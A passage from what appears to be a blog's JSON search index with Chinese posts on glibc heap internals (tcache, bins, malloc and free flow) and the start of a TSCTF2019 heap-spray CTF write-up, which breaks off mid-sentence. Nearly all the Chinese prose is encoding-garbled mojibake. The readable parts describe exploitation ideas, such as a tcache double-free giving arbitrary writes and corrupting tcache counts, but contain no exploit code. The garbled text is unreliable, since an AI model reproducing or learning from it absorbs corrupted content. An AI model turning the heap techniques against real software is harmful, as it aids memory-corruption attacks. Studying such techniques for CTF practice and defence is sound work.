(size);\ntcache->counts[tc_idx]\n```\n\næ¥è®¿é—®ç´¢å¼•å¯¹åº”binçš„countã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-08-08_23-01-51.png)\n\nä»0x55555555b010è‡³0x55555555b04féƒ½æ˜¯countsè¿™ä¸ªæ•°ç»„çš„èŒƒå›´ã€‚\n\nâ–²ç”±äºä½¿ç”¨tcacheæ—¶ï¼Œä¸ä¼šæ£€æŸ¥tcache->counts[tc_idx]çš„å¤§å°æ˜¯å¦å¤„åœ¨[0,7]çš„èŒƒå›´ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬å¯ä»¥å°†å¯¹åº”binçš„countæ”¹æˆ[0,7]ä¹‹å¤–çš„æ•°ï¼Œè¿™æ ·ä¸‹å›å†freeè¯¥binå¯¹åº”å¤§å°çš„chunkæ—¶ï¼Œå°±ä¸ä¼šå°†è¯¥chunkç½®å…¥tcacheä¸­ï¼Œä½¿å¾—tcacheä¸æ»¡ä¹Ÿèƒ½ä¸è¿›å…¥tcacheã€‚\n\nB.entriesï¼šæ˜¯ä¸ªbinæŒ‡é’ˆæ•°ç»„ï¼Œå…±64ä¸ªæŒ‡é’ˆæ•°ç»„ï¼Œæ¯ä¸ªæŒ‡é’ˆ8ä¸ªå­—èŠ‚ï¼Œæ€»è®¡å¤§å°0x200å­—èŠ‚ï¼ŒæŒ‡é’ˆæŒ‡å‘å¯¹åº”çš„binä¸­ç¬¬ä¸€ä¸ªchunkçš„é¦–åœ°å€ï¼Œè¿™ä¸ªé¦–åœ°å€ä¸æ˜¯chunkå¤´çš„é¦–åœ°å€ï¼Œè€Œæ˜¯å¯¹åº”æ•°æ®çš„é¦–åœ°å€ã€‚å¦‚æœè¯¥binä¸ºç©ºï¼Œåˆ™è¯¥æŒ‡é’ˆä¹Ÿä¸ºç©ºã€‚ä¸€èˆ¬ä¼šä½¿ç”¨tcache->entries[tc_idx] != NULLæ¥åˆ¤æ–­æ˜¯å¦ä¸ºç©ºã€‚\n\n \n\nâ‘¡2.29åŠä»¥ä¸Šï¼Œåœ¨entryä¸­å¢åŠ äº†keyå­—æ®µï¼Œç»“æ„ä½“å¤§å°ä¸º0x290ï¼Œcountç”±åŸæ¥çš„ä¸€ä¸ªå­—èŠ‚å˜ä¸ºä¸¤ä¸ªå­—èŠ‚\n\n```c\n#æ³¨é‡Šå¤´\n\ntypedef struct tcache_entry\n{\n  struct tcache_entry *next;\n  /* This field exists to detect double frees.  */\n  struct tcache_perthread_struct *key; /* æ–°å¢æŒ‡é’ˆ */\n} tcache_entry;\n```\n\n(2)ç±»ä¼¼äºä¸€ä¸ªæ¯”è¾ƒå¤§çš„fastbinsã€‚æ€»å…±64ä¸ªbinã€‚\n\n(3)å½’ç±»æ–¹å¼ï¼š\n\nç›¸åŒå¤§å°çš„chunkå½’åˆ°ä¸€ç±»ï¼šå¤§å°èŒƒå›´[0x20,0x410]ã€‚æ¯ç»„binsä¸­çš„chunkå¤§å°ä¸€å®šã€‚ä¸”ä¸€ç»„binä¸­æœ€å¤šåªèƒ½æœ‰7ä¸ªchunkï¼Œå¦‚æœfreeæŸå¤§å°binçš„chunkæ•°é‡è¶…è¿‡7ï¼Œé‚£ä¹ˆå¤šä½™çš„chunkä¼šæŒ‰ç…§æ²¡æœ‰tcacheæœºåˆ¶æ¥freeã€‚\n\n(4).å•å‘é“¾è¡¨ï¼š\n\nâ–²ä¾‹å­ï¼ša=malloc(0x10); b=malloc(0x10); c=malloc(0x10); d=malloc(0x10)\n\nFastbinY,d,c,b,a\n\nâ‘ free(a)ä¹‹åï¼štcachebins[0x20]->a;  a.fd=0\n\nâ‘¡free(b)ä¹‹åï¼štcachebins[0x20]->b;  b.fd=a   a.fd=0\n\nâ‘¢free(c)ä¹‹åï¼štcachebins[0x20]->c;  c.fd=b    b.fd->a;  a.fd=0\n\nâ‘£free(d)ä¹‹åï¼štcachebins[0x20]->d;  d.fd=c    c.fd->b;  b.fd->a;  a.fd=0\n\nâ˜…ä½†æ˜¯è¿™é‡Œçš„fdæŒ‡å‘çš„æ˜¯chunkå†…å®¹åœ°å€ï¼Œè€Œä¸æ˜¯å…¶å®ƒçš„binsä¸­çš„fdæŒ‡å‘çš„æ˜¯chunkå¤´åœ°å€ã€‚\n\n(5)åè¿›å…ˆå‡ºï¼Œä¸fastbinsç±»ä¼¼ã€‚ä¸”tcacheçš„ä¼˜å…ˆçº§æœ€é«˜ã€‚\n\n(6)ç‰¹æ®Šï¼š\n\nâ‘ å½“tcacheæŸä¸ªbinè¢«å¡«æ»¡ä¹‹åï¼Œå†freeç›¸åŒå¤§å°çš„binæ”¾åˆ°fastbinä¸­æˆ–è€…smallbinsä¸­ï¼Œä¹‹åè¿ç»­ç”³è¯·7ä¸ªè¯¥å¤§å°çš„chunkï¼Œé‚£ä¹ˆtcacheä¸­çš„è¿™ä¸ªbinå°±ä¼šè¢«æ¸…ç©ºã€‚ä¹‹åå†ç”³è¯·è¯¥å¤§å°çš„chunkå°±ä¼šä»fastbinsæˆ–è€…smallbinsä¸­æ‰¾ï¼Œå¦‚æœæ‰¾åˆ°äº†ï¼Œé‚£ä¹ˆè¿”å›è¯¥chunkçš„åŒæ—¶ï¼Œä¼šå°†è¯¥å¤§å°çš„fastbinæˆ–è€…smallbinä¸­æ‰€æœ‰çš„chunkéƒ½ç§»åŠ¨åˆ°å¯¹åº”å¤§å°çš„tcacheçš„binä¸­ï¼Œç›´è‡³å¡«æ»¡7ä¸ªã€‚(ç§»åŠ¨æ—¶ä»æ—§éµå¾ªå…ˆè¿›åå‡ºçš„åŸåˆ™ï¼Œæ‰€ä»¥ç§»åŠ¨ä¹‹åchunké¡ºåºä¼šå‘ç”Ÿé¢ å€’)\n\nâ‘¡libc-2.26ä¸­å­˜åœ¨tcache poisoningæ¼æ´ï¼Œå³å¯ä»¥è¿ç»­free(chunk)å¤šæ¬¡ã€‚\n\nå‡å¦‚chunk0,chunk1ï¼Œç„¶åfree(chunk0)ä¸¤æ¬¡ï¼Œè¿™æ ·tcache binä¸­å°±æ˜¯ï¼š\n\nchunk0.fd ->chunk0ï¼Œå³chunk0->chunk0\n\né‚£ä¹ˆç¬¬ä¸€æ¬¡ç”³è¯·å›chunk0ï¼Œä¿®æ”¹fdä¸ºfakechunkï¼Œtcache binä¸­å°±æ˜¯ï¼š\n\nchunk0.fd->fakechunkï¼Œå³chunk0->fakechunk\n\nä¹‹åå†ç”³è¯·å›chunk0ï¼Œå†ç”³è¯·ä¸€æ¬¡å°±æ˜¯fakechunkäº†ï¼Œå®ç°ä»»æ„åœ°å€ä¿®æ”¹ã€‚\n\nâ˜…è¿™ä¸ªæ¼æ´åœ¨libc2.27ä¸­å°±è¢«ä¿®å¤äº†ã€‚\n\nâ‘¢ä»tcacheä¸­ç”³è¯·Chunkçš„æ—¶å€™ä¸ä¼šæ£€æŸ¥sizeä½ï¼Œä¸éœ€è¦æ„é€ å­—èŠ‚é”™è¯¯ã€‚\n\n(7)2.31ä¸‹æ–°å¢stashæœºåˆ¶ï¼š\n\nåœ¨ Fastbins å¤„ç†è¿‡ç¨‹ä¸­æ–°å¢äº†ä¸€ä¸ª Stash æœºåˆ¶ï¼Œæ¯æ¬¡ä» Fastbins å– Chunk çš„æ—¶å€™ä¼šæŠŠå‰©ä¸‹çš„ Chunk å…¨éƒ¨ä¾æ¬¡æ”¾è¿›å¯¹åº”çš„ tcacheï¼Œç›´åˆ° Fastbins ç©ºæˆ–æ˜¯ tcache æ»¡ã€‚\n\n(8)2.32ä¸‹æ–°å¢fdå¼‚æˆ–æœºåˆ¶ï¼š\n\nä¼šå°†fdå¼‚æˆ–ä¸ŠæŸä¸ªå€¼ã€‚è¿™ä¸ªå…·ä½“çœ‹å…¶ä»–æ–‡ç« å§ï¼Œæˆ‘è‡ªå·±è°ƒè¯•å¤§å¤šéƒ½æ˜¯å¼‚æˆ–heap_base/0x1000ï¼Œæ¯”è¾ƒå¥‡æ€ªï¼Œå…·ä½“é¢˜ç›®å…·ä½“åˆ†æã€‚\n\n \n\n \n\n \n\n6.Topchunk:ä¸å±äºä»»ä½•Binï¼Œåœ¨arenaä¸­å±äºæœ€é«˜åœ°å€ï¼Œæ²¡æœ‰å…¶å®ƒç©ºé—²å—æ—¶ï¼Œtopchunkå°±ä¼šè¢«ç”¨äºåˆ†é…ã€‚\n\n \n\n \n\n7.last_remainder:å½“è¯·æ±‚small chunkå¤§å°å†…å­˜æ—¶ï¼Œå¦‚æœå‘ç”Ÿåˆ†è£‚ï¼Œåˆ™å‰©ä½™çš„chunkä¿å­˜ä¸ºlast_remainderï¼Œæ”¾å…¥unsortedbinä¸­ã€‚\n\n \n\n \n\nâ–²æ²¡æœ‰tcacheçš„mallocå’Œfreeæµç¨‹ï¼š\n\nå››ã€mallocæµç¨‹ï¼š\n\nâ˜…å¦‚æœæ˜¯å¤šçº¿ç¨‹æƒ…å†µä¸‹ï¼Œé‚£ä¹ˆä¼šå…ˆè¿›è¡Œåˆ†é…åŒºçš„åŠ é”ï¼Œè¿™é‡Œå°±å¯èƒ½å­˜åœ¨æ¡ä»¶ç«äº‰æ¼æ´ã€‚\n\n1.å¦‚æœsizeåœ¨fastbinsçš„èŒƒå›´å†…ï¼Œåˆ™å…ˆåœ¨fastbinsä¸­æŸ¥æ‰¾ï¼Œæ‰¾åˆ°åˆ™ç»“æŸï¼Œæ²¡æ‰¾åˆ°å°±å»unsortedbinsä¸­æ‰¾ã€‚\n\n2.å¦‚æœsizeä¸åœ¨fastbinsèŒƒå›´ä¸­ï¼Œè€Œåœ¨smallbinsèŒƒå›´ä¸­ï¼Œåˆ™æŸ¥æ‰¾smallbinsï¼ˆåœ¨2.23ä¸‹å¦‚æœå‘ç°smallbiné“¾è¡¨æœªåˆå§‹åŒ–ï¼Œåˆ™ä¼šè°ƒç”¨malloc_consolidateå‡½æ•°ï¼Œä½†æ˜¯å®é™…æƒ…å†µåœ¨ç”³è¯·chunkä¹‹å‰éƒ½å·²ç»åˆå§‹åŒ–è¿‡äº†ï¼Œæ‰€ä»¥è¿™ä¸ªä¸æ€ä¹ˆé‡è¦if (victim == 0) /* initialization check */ malloc_consolidate (av); è€Œä¸”è¿™ä¸ªæ“ä½œä»2.27å¼€å§‹å·²ç»æ²¡æœ‰äº†ï¼Œå¦‚æœèƒ½å¤Ÿè®©smallbinä¸åˆå§‹åŒ–ï¼Œæˆ–è€…å°†main_arena+0x88è®¾ç½®ä¸º0ï¼‰ï¼Œæ­¤æ—¶è‹¥smallbinæ‰¾åˆ°ç»“æŸï¼Œæ²¡æ‰¾åˆ°å»unsortedbinsä¸­æ‰¾\n\n3.å¦‚æœsizeä¸åœ¨fastbinsï¼ŒsmallbinsèŒƒå›´ä¸­ï¼Œé‚£ä¸€å®šåœ¨largebinsä¸­ï¼Œé‚£ä¹ˆå…ˆè°ƒç”¨malloc_consolidateå‡½æ•°å°†æ‰€æœ‰çš„fastbinä¸­çš„chunkå–å‡ºæ¥ï¼Œåˆå¹¶ç›¸é‚»çš„freechunkï¼Œæ”¾åˆ°unsortedbinä¸­ï¼Œæˆ–è€…ä¸topchunkåˆå¹¶ã€‚å†å»largebinsä¸­æ‰¾ï¼Œæ‰¾åˆ°ç»“æŸï¼Œæ²¡æ‰¾åˆ°å°±å»unsortedbinsä¸­æ‰¾ã€‚\n\n4.unsortedbinsä¸­æŸ¥æ‰¾ï¼š\n\n(1)å¦‚æœunsortedbinä¸­åªæœ‰last_reaminderï¼Œä¸”åˆ†é…çš„sizeå°äºlast_remainderï¼Œä¸”è¦æ±‚çš„sizeèŒƒå›´ä¸ºsmallbinçš„èŒƒå›´ï¼Œåˆ™åˆ†è£‚ï¼Œå°†åˆ†è£‚ä¹‹åçš„ä¸€ä¸ªåˆé€‚çš„chunkç»™ç”¨æˆ·ï¼Œå‰©ä½™çš„chunkå˜æˆæ–°çš„last_remainderè¿›å…¥unsortedbinä¸­ã€‚å¦‚æœå¤§äºlast_remainderï¼Œæˆ–è€…åˆ†é…çš„sizeèŒƒå›´ä¸ºlargebinçš„èŒƒå›´ï¼Œåˆ™å°†last_remainderæ•´ç†è‡³å¯¹åº”binä¸­ï¼Œè·³è‡³ç¬¬5æ­¥ã€‚\n\n(2)å¦‚æœunsortedbinä¸­ä¸åªä¸€ä¸ªchunkï¼Œåˆ™å…ˆæ•´ç†ï¼Œéå†unsortedbinsã€‚å¦‚æœé‡åˆ°ç²¾ç¡®å¤§å°ï¼Œç›´æ¥è¿”å›ç»™ç”¨æˆ·ï¼Œæ¥ç€æ•´ç†å®Œã€‚å¦‚æœä¸€ç›´æ²¡é‡åˆ°è¿‡ï¼Œåˆ™è¯¥è¿‡ç¨‹ä¸­æ‰€æœ‰é‡åˆ°çš„chunkéƒ½ä¼šè¢«æ•´ç†åˆ°å¯¹åº”çš„fastbinsï¼Œsmallbinsï¼Œlargebinsä¸­å»ã€‚\n\n5.unsortedbinsä¸­è¿˜æ˜¯æ‰¾ä¸åˆ°ï¼Œåˆ™ï¼š\n\n(1)è‹¥å½“å‰sizeæœ€å¼€å§‹åˆ¤æ–­æ˜¯å¤„äºsmallbinsèŒƒå›´å†…ï¼Œåˆ™å†å»smallbinsæ‰¾ï¼Œè¿™å›ä¸æ‰¾ç²¾ç¡®å¤§å°ï¼Œæ‰¾æœ€æ¥è¿‘ç•¥å¤§äºsizeçš„ä¸€ä¸ªå›ºå®šå¤§å°çš„chunkç»™åˆ†è£‚ï¼Œå°†ç¬¦åˆsizeçš„chunkè¿”å›ç»™ç”¨æˆ·ï¼Œå‰©ä¸‹çš„æ‰”ç»™unsortedbinsï¼Œä½œä¸ºæ–°çš„last_remainderã€‚\n\n(2)è‹¥å½“å‰sizeæœ€å¼€å§‹åˆ¤æ–­å¤„äºlargebinsèŒƒå›´å†…ï¼Œåˆ™å»largebinsä¸­æ‰¾ï¼Œå’Œæ­¥éª¤(1)ç±»ä¼¼ã€‚\n\n(3)è‹¥å½“å‰sizeå¤§äºlargebinsä¸­æœ€å¤§çš„chunkå¤§å°ï¼Œé‚£ä¹ˆå°±å»topchunkæ¥åˆ†å‰²ä½¿ç”¨ã€‚\n\n6.topchunkåˆ†å‰²ï¼š\n\n(1)topchunkç©ºé—´å¤Ÿï¼Œåˆ™ç›´æ¥åˆ†å‰²ã€‚\n\n(2)topchunkç©ºé—´ä¸å¤Ÿï¼Œé‚£ä¹ˆå†è°ƒç”¨malloc_consolidateå‡½æ•°è¿›è¡Œæ•´ç†ä¸€ä¸‹ï¼Œç„¶ååˆ©ç”¨brkæˆ–è€…mmapè¿›è¡Œå†æ‹“å±•ã€‚\n\nâ‘ brkæ‰©å±•ï¼šå½“ç”³è¯·çš„sizeå°äº128Kæ—¶ï¼Œä½¿ç”¨è¯¥æ‰©å±•ã€‚å‘é«˜åœ°å€æ‹“å±•æ–°çš„topchunkï¼Œä¸€èˆ¬åŠ 0x21000ï¼Œä¹‹åä»æ–°çš„topchunkå†åˆ†é…ï¼Œæ—§çš„topchunè¿›å…¥unsortedbinä¸­ã€‚\n\nâ‘¡mmapæ‰©å±•ï¼šç”³è¯·çš„sizeå¤§äºç­‰äºmmapåˆ†é…é˜ˆå€¼(æœ€å¼€å§‹ä¸º128k)æ—¶ï¼Œä½¿ç”¨è¯¥æ‰©å±•ï¼Œä½†æ˜¯è¿™ç§æ‰©å±•ç”³è¯·åˆ°çš„chunkï¼Œåœ¨é‡Šæ”¾æ—¶ä¼šè°ƒç”¨munmapå‡½æ•°ç›´æ¥è¢«è¿”å›ç»™æ“ä½œç³»ç»Ÿï¼Œè€Œä¸ä¼šè¿›å…¥binsä¸­ã€‚æ‰€ä»¥å¦‚æœç”¨æŒ‡é’ˆå†å¼•ç”¨è¯¥chunkå—æ—¶ï¼Œå°±ä¼šé€ æˆsegmentation faulté”™è¯¯ã€‚\n\nâ–²å½“ptmalloc munmap chunkæ—¶ï¼Œå¦‚æœå›æ”¶çš„chunkç©ºé—´å¤§å°å¤§äºmmapåˆ†é…é˜ˆå€¼çš„å½“å‰å€¼ï¼Œå¹¶ä¸”å°äºDEFAULT_MMAP_THRESHOLD_MAXï¼ˆ32ä½ç³»ç»Ÿé»˜è®¤ä¸º512KBï¼Œ64ä½ç³»ç»Ÿé»˜è®¤ä¸º32MBï¼‰ï¼Œptmallocä¼šæŠŠmmapåˆ†é…é˜ˆå€¼è°ƒæ•´ä¸ºå½“å‰å›æ”¶çš„chunkçš„å¤§å°ï¼Œå¹¶å°†mmapæ”¶ç¼©é˜ˆå€¼ï¼ˆmmap trim thresholdï¼‰è®¾ç½®ä¸ºmmapåˆ†é…é˜ˆå€¼çš„2å€ã€‚è¿™å°±æ˜¯ptmallocçš„å¯¹mmapåˆ†é…é˜ˆå€¼çš„åŠ¨æ€è°ƒæ•´æœºåˆ¶ï¼Œè¯¥æœºåˆ¶æ˜¯é»˜è®¤å¼€å¯çš„ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ç”¨mallopt()å…³é—­è¯¥æœºåˆ¶\n\nâ–²å¦‚æœå°† M_MMAP_MAX è®¾ç½®ä¸º 0ï¼Œptmalloc å°†ä¸ä¼šä½¿ç”¨ mmap åˆ†é…å¤§å—å†…å­˜ã€‚\n\n \n\näº”ã€freeæµç¨‹ï¼š\n\nâ˜…å¤šçº¿ç¨‹æƒ…å†µä¸‹ï¼Œfree()å‡½æ•°åŒæ ·é¦–å…ˆéœ€è¦è·å–åˆ†é…åŒºçš„é”ï¼Œæ¥ä¿è¯çº¿ç¨‹å®‰å…¨ã€‚\n\n1.é¦–å…ˆåˆ¤æ–­è¯¥chunkæ˜¯å¦ä¸ºmmaped chunkï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è°ƒç”¨ munmap()é‡Šæ”¾mmaped chunkï¼Œè§£é™¤å†…å­˜ç©ºé—´æ˜ å°„ï¼Œè¯¥è¯¥ç©ºé—´ä¸å†æœ‰æ•ˆã€‚åŒæ—¶æ»¡è¶³æ¡ä»¶åˆ™è°ƒæ•´mmapé˜ˆå€¼ã€‚\n\n2.å¦‚æœsizeä½äºfastbinsèŒƒå›´å†…ï¼Œç›´æ¥æ”¾åˆ°fastbinsä¸­ã€‚\n\n(è¿™é‡Œæœ‰ç‚¹äº‰è®®ï¼Œåœ¨ã€Šglibcå†…å­˜ç®¡ç†ptmallocæºä»£ç åˆ†æ.pdfã€‹ä¸€ä¹¦ä¸­ï¼Œå†™åˆ°ï¼š\n\nå¦‚æœæ‰§è¡Œåˆ°è¿™ä¸€æ­¥ï¼Œè¯´æ˜é‡Šæ”¾äº†ä¸€ä¸ªä¸top chunkç›¸é‚»çš„chunkã€‚åˆ™æ— è®ºå®ƒæœ‰å¤šå¤§ï¼Œéƒ½å°†å®ƒä¸top chunkåˆå¹¶ï¼Œå¹¶æ›´æ–°top chunkçš„å¤§å°ç­‰ä¿¡æ¯ã€‚\n\nä½†æ˜¯å®é™…æµ‹è¯•ï¼Œå¦‚æœsizeä½äºfastbinsèŒƒå›´å†…ï¼Œåˆ™ä¸ç®¡æ˜¯å¦ä¸topchunkç›¸é‚»ï¼Œéƒ½ç›´æ¥æ”¾åˆ°fastbinä¸­ï¼Œæµ‹è¯•ç¯å¢ƒæ˜¯libc2.23ï¼Œå†…æ ¸ç‰ˆæœ¬æ˜¯Linux version 5.10.13ï¼Œä¹Ÿå¯èƒ½æ˜¯æŸäº›å‚æ•°çš„é—®é¢˜æŠŠï¼Œå…·ä½“é¢˜ç›®åˆ†æå°±å¥½äº†ã€‚)\n\n3.å¦‚æœsizeä¸åœ¨fastbinsèŒƒå›´å†…ï¼Œåˆ™è¿›è¡Œåˆ¤æ–­ï¼š\n\n(1)å…ˆåˆ¤æ–­å‰ä¸€ä¸ªchunk_beforeï¼Œå¦‚æœchunk_beforeæ˜¯freeçŠ¶æ€çš„ï¼Œé‚£ä¹ˆå°±å°†å‰ä¸€ä¸ªchunkä»å…¶å¯¹åº”çš„binsä¸­å–å‡ºæ¥(unlink)ï¼Œç„¶ååˆå¹¶è¿™ä¸¤ä¸ªchunkå’Œchunk_beforeã€‚\n\nç”±äºè¿˜æ²¡æœ‰è¿›å…¥é“¾è¡¨ç»“æ„ä¸­ï¼Œæ‰€ä»¥è¿™é‡Œå¯»æ‰¾chunk_beforeåœ°å€æ˜¯é€šè¿‡å½“å‰åœ°å€å‡å»å½“å‰chunkçš„presizeå†…å®¹ï¼Œå¾—åˆ°chunk_beforeçš„åœ°å€ï¼Œä»è€Œè·å–å…¶in_useä½ã€‚\n\nè¿™ä¹Ÿæ˜¯presizeå”¯ä¸€çš„ç”¨é€”ï¼Œæ‰€ä»¥åœ¨å †æº¢å‡ºä¸­ï¼Œå¯ä»¥åªè¦ä¸è¿›è¡Œfreeï¼Œpresizeå¯ä»¥ä»»æ„ä¿®æ”¹ã€‚\n\n(è¿™é‡Œå¦‚æœchunk_beforeæ˜¯ä½äºfastbinsä¸­åˆ™æ²¡åŠæ³•åˆå¹¶ï¼Œå› ä¸ºåœ¨fastbinsä¸­çš„in_useä½ä¸ä¼šè¢«æ”¹å˜ï¼Œæ°¸è¿œæ˜¯1ï¼Œåœ¨åˆ¤æ–­æ—¶å§‹ç»ˆè®¤ä¸ºè¯¥chunkæ˜¯å¤„äºallocatedçŠ¶æ€çš„)\n\n(2)å†åˆ¤æ–­åä¸€ä¸ªchunkï¼Œå¦‚æœåä¸€ä¸ªchunkæ˜¯freeçŠ¶æ€ï¼Œé‚£ä¹ˆå¦‚æ­¥éª¤(1)ï¼Œåˆå¹¶ï¼Œä¹‹åå°†åˆå¹¶å’Œçš„chunkæ”¾å…¥åˆ°unsortedbinsä¸­å»ã€‚å¦‚æœåä¸€ä¸ªchunkå°±æ˜¯topchunkï¼Œé‚£ä¹ˆç›´æ¥å°†è¿™ä¸ªchunkå’Œtopchunkåˆå¹¶å®Œäº‹ã€‚\n\nä¹‹åå°†åˆå¹¶ä¹‹åçš„chunkè¿›è¡Œåˆ¤æ–­ï¼Œ(è¿™é‡Œä¹Ÿå¯èƒ½ä¸å‘ç”Ÿåˆå¹¶ï¼Œä½†ä¾æ—§ä¼šè¿›è¡Œåˆ¤æ–­)å¦‚æœsizeå¤§äºFASTBIN_CONSOLIDATION_THRESHOLD(0x10000)ï¼Œé‚£ä¹ˆå°±è°ƒç”¨malloc_consolidateå‡½æ•°è¿›è¡Œæ•´ç†fastbinsï¼Œç„¶åç»™åˆ°unsortedbinsä¸­ï¼Œç­‰å¾…mallocæ—¶è¿›è¡Œæ•´ç†ã€‚\n\n \n\nâ–²32ä½ä¸64ä½åŒºåˆ«ï¼Œå·®ä¸å¤šå…¶å®ï¼Œå¯¹äº0x8å’Œ0x10çš„å˜åŒ–è€Œå·²ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs1.jpg)\n","tags":["Heap-Knowledge"],"categories":["PWN","pwnå †"]},{"title":"TSCTF2019 è–›å®šè°”çš„å †å—-HeapSpray","url":"/2021/08/18/TSCTF2019 è–›å®šè°”çš„å †å—-HeapSpray/","content":"\nheapsprayæœ‰å¾ˆå¤šçš„åº”ç”¨åœºæ™¯ï¼Œä½†å¤§å¤šéƒ½æ˜¯windowsä¸‹çš„æ¼æ´åº”ç”¨ï¼Œå…³äºGlibcçš„æ¯”è¾ƒå°‘ï¼Œè‡³ä»Šåªçœ‹è§ä¸¤é¢˜ï¼š\n\n[pwnhub.cn æ•…äº‹çš„å¼€å§‹ calc](https://atum.li/2016/12/05/calc/)\n\n[TSCTF2019 è–›å®šè°”çš„å †å—](https://www.anquanke.com/post/id/206484)\n\nè¿™é‡Œå‚è€ƒç¬¬äºŒç¯‡æ–‡ç« é’ˆå¯¹ç¬¬äºŒé¢˜åšä¸ªå¤ç°ï¼Œç†è§£ä¸‹å †å–·çš„æ€æƒ³ã€‚\n\n1.å‡½æ•°ç†è§£ï¼Œè¿™é‡Œåˆ†æèµ·æ¥æ¯”è¾ƒéº»çƒ¦ï¼Œæœ€å¥½å°±è°ƒè¯•ï¼Œç›´æ¥ç»™å‡ºç›¸å…³çš„åŠŸèƒ½ï¼š\n\n(1)Createå‡½æ•°ï¼š\n\nâ‘ åˆ›å»ºchunkï¼Œä½†æ¯æ¬¡Createä¼šåˆ›å»º0x10ä¸ªç›¸åŒå¤§å°çš„chunkï¼Œä¸”å¤§å°ä¸ºè¾“å…¥size+4ã€‚æ¯”å¦‚è¾“å…¥sizeä¸º0xcï¼Œé‚£ä¹ˆåˆ›å»ºçš„chunkå°±æ˜¯0x10ä¸ª0x18å¤§å°çš„Chunkã€‚åŒæ—¶æ¯0x10ä¸ªå°chunkåœ¨å®è§‚æ„ä¹‰ä¸Šç»„æˆä¸€ä¸ªå¤§chunkï¼Œè¿™é‡Œç”¨SmallChunkå’ŒBigChunkåŒºåˆ†ä¸€ä¸‹ã€‚\n\nâ‘¡chunkçš„ç´¢å¼•åœ¨å…¨å±€æ•°ç»„dword_4060ï¼ŒchunkListä¸­éšæœºæ’åˆ—ï¼Œæ¯”å¦‚idxä¸º0çš„chunkä¸ä¸€å®šæ˜¯ç¬¬ä¸€ä¸ªåˆ›å»ºçš„ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-08-10_21-46-26.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-08-10_21-49-21.png)\n\nè¿™ç‚¹åœ¨åé¢å †å–·ä¼šç”¨åˆ°ï¼Œæ— æ³•ç®€å•åœ°é€šè¿‡æ‰“å°å€¼æ¥åˆ¤æ–­heapåœ°å€ï¼Œåªèƒ½åˆ¤æ–­å‡ºåœ¨å“ªä¸ªBigChunkä¸­ï¼Œè¿˜å¾—åˆ¤æ–­å‡ºæŸä¸ªSmallChunkåœ¨BigChunkä¸­çš„ä½ç½®æ‰èƒ½æ³„éœ²å‡ºå †åœ°å€ã€‚\n\nâ‘¢åˆ›å»ºchunkè¯»å–æ•°æ®æ—¶read_strå‡½æ•°é‡Œæœ‰\\x00æˆªæ–­ï¼Œæ‰€ä»¥Displayåœ¨æ²¡æœ‰UAFçš„æƒ…å†µä¸‹éš¾ä»¥æ³„éœ²å‡ºåœ°å€ï¼Œè¿™é‡Œä¹Ÿä¸å­˜åœ¨å †æº¢å‡ºã€‚\n\nâ‘£é€‰æ‹©chunkç±»å‹æ—¶ä¼šç»™chunk_addr+sizeå¤„èµ‹å€¼ï¼Œè¿™é‡Œå°±æ˜¯ä¹‹å‰ç”³è¯·size+4çš„åŸå› ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-08-10_21-56-19.png)\n\nè¿™ä¸ªèµ‹äºˆçš„å€¼æ˜¯ä¸€ä¸ªELFä¸Šçš„dataæ•°æ®åœ°å€ï¼Œæ²¡å•¥ç”¨ï¼Œè¿·æƒ‘ç”¨çš„ï¼ŒåŒæ—¶å¦‚æœé€‰æ‹©çš„é€‰é¡¹ä¸ä¸º1-4çš„è¯ï¼Œå°±ä¼šä¸èµ‹å€¼ï¼Œè¿™ä¸ªåœ¨åé¢å¾ˆæœ‰ç”¨ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-08-10_21-58-56.png)\n\n(2)Displayå‡½æ•°ï¼š\n\næ¯”è¾ƒå¸¸è§„ï¼Œè¾“å‡ºç»™å®šindexèŒƒå›´çš„SmallChunkçš„å†…å®¹\n\n(3)Deleteå‡½æ•°ï¼š\n\nåˆ é™¤æœ€åä¸€æ¬¡Createçš„BigChunkçš„æ‰€æœ‰SmallChunkï¼Œfreeæ•°æ®ä¸”ç½®æŒ‡é’ˆNULLï¼Œæ²¡å•¥æ¼æ´ã€‚ä½†æ˜¯è¿™é‡Œåˆ é™¤æ˜¯ä¾æ®chunkListçš„é¡ºåºç´¢å¼•åˆ é™¤ï¼Œè€ŒchunkListåˆæ˜¯è¢«æ‰“ä¹±çš„ï¼Œæ‰€ä»¥åˆ é™¤ä¹‹åçš„é¡ºåºå…¶å®ä¸æ˜¯æˆ‘ä»¬æœ€å¼€å§‹è¾“å…¥æ•°æ®çš„é¡ºåºï¼Œè¿™ä¸ªåœ¨åé¢unsortedbinæ³„éœ²æ•°æ®çš„æ—¶å€™éœ€è¦æ³¨æ„ä¸€ä¸‹ã€‚\n\n(4)Modifyå‡½æ•°ï¼š\n\nç¼–è¾‘æŒ‡å®šindexçš„Small Blockçš„å†…å®¹ï¼Œè¿™é‡Œæ²¡å•¥ç”¨\n\n(5)CallFunctionå‡½æ•°ï¼š\n\næ ¹æ®Createæ—¶çš„æœ€åé‚£4byteçš„æ•°å€¼æ¥å†³å®šæ‰§ä¸æ‰§è¡ŒæŸä¸ªå‡½æ•°æŒ‡é’ˆ(è¿™ä¸ªå‡½æ•°æŒ‡é’ˆå°±æ˜¯æœ€å¼€å§‹åˆ›å»ºçš„æ—¶å€™èµ‹å€¼çš„ELFä¸Šçš„æ•°æ®)ã€‚\n\nâ‘ *(chunk_addr+size) != 0ï¼Œåˆ™set *(*(chunk_addr+size)) -= 1\n\nâ‘¡*(chunk_addr+size) == 0ï¼Œåˆ™jmp 